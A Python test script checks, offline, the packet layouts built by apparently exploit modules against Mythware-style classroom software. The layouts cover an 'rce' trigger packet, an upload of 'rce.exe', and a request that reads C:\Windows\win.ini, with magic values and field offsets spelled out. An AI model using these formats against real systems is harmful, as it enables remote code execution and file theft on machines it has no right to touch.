#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 报文布局检查，不联网
import os
import socket
import struct
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "exploit"))

import media_read
import media_upload
import mythware_poc as mp
import remote_batch_rce as rbr


def check_block():
    g = bytes(range(16))
    pkt = mp.build_packet("10.1.2.3", g, 3, 0x50, 0, 0)
    assert len(pkt) == 1440
    assert struct.unpack_from("<I", pkt, 0x00)[0] == 0x424C434B
    assert struct.unpack_from("<I", pkt, 0x04)[0] == 0x00010000
    assert struct.unpack_from("<I", pkt, 0x08)[0] == 1412
    assert pkt[0x0C:0x1C] == g
    assert struct.unpack_from("<I", pkt, 0x1C)[0] == 3
    assert pkt[0x24:0x28] == socket.inet_aton("10.1.2.3")
    assert struct.unpack_from("<I", pkt, 0x2C)[0] == 0x50
    assert struct.unpack_from("<I", pkt, 0x30)[0] == 0
    assert struct.unpack_from("<I", pkt, 0x38)[0] == 0

    pkt = mp.build_packet("127.0.0.1", g, 1, 0x50, 0, 4, b"ABCD")
    assert pkt[0x3C:0x40] == b"ABCD"
    assert struct.unpack_from("<I", pkt, 0x38)[0] == 4

    try:
        mp.build_packet("127.0.0.1", g, 1, 1, 0, 1400)
        assert False, "oversize should be rejected"
    except ValueError:
        pass


def check_trigger():
    g = bytes(range(16))
    pkt = rbr.make_trigger(g, "rce")
    assert len(pkt) == 0x1C
    assert pkt[0:3] == b"rce" and pkt[3] == 0
    assert struct.unpack_from("<I", pkt, 4)[0] == 0x00010000
    assert struct.unpack_from("<I", pkt, 8)[0] == 0
    assert pkt[0x0C:0x1C] == g

    pkt = rbr.make_trigger(g, "abcd")
    assert pkt[0:4] == b"abcd"

    try:
        rbr.make_trigger(g, "abcde")
        assert False, "5-char command should be rejected"
    except ValueError:
        pass


def check_media():
    payload = media_upload._create_payload(0x11223344, "rce.exe", 0)
    assert struct.unpack_from("<I", payload, 0)[0] == 0x11223344
    assert struct.unpack_from("<Q", payload, 0x18)[0] == 0
    assert payload[0x20:] == "rce.exe".encode("utf-16le") + b"\x00\x00"

    msg = media_read.open_msg(r"C:\Windows\win.ini", 0)
    assert struct.unpack_from("<I", msg, 4)[0] == 0x4F50454E
    path = r"C:\Windows\win.ini".encode("utf-16le") + b"\x00\x00"
    assert struct.unpack_from("<I", msg, 8)[0] == 8 + len(path)
    assert struct.unpack_from("<Q", msg, 0x0C)[0] == 0
    assert msg[0x14:] == path


if __name__ == "__main__":
    check_block()
    check_trigger()
    check_media()
    print("ok")
